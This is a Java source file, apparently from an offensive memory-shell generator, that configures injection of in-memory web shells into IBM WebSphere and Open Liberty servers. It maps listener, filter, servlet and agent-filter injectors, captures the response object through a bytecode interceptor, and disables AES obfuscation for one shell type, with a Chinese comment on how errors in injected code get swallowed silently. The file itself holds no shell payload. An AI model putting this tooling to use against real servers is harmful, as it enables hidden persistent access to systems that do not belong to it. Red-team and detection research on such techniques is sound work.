package com.reajason.javaweb.memshell.server.websphere;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import java.util.Collections;
import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class WebSphere extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connContext"), "_response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Map<String, Object> getShellObfuscationOptionOverrides(String shellType) {
        if (WAS_AGENT_FILTER_MANAGER.equals(shellType)) {
            // AgentFilterManager 的 shell 被 defineClass 进 WebAppFilterManager 的 defining
            // loader；Open Liberty 上这是 Equinox 的 com.ibm.ws.webcontainer bundle loader，
            // 该 bundle 未 import javax.crypto，AES 解密例程会在 <clinit> 抛
            // NoClassDefFoundError，随后被注入代码的 catch (Throwable) 静默吞掉。
            return Collections.singletonMap("enableAES", false);
        }
        return super.getShellObfuscationOptionOverrides(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.websphere.WebSphereServletInjector")
                .addInjector(WAS_AGENT_FILTER_MANAGER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereFilterChainAgentInjector")
                .build();
    }
}
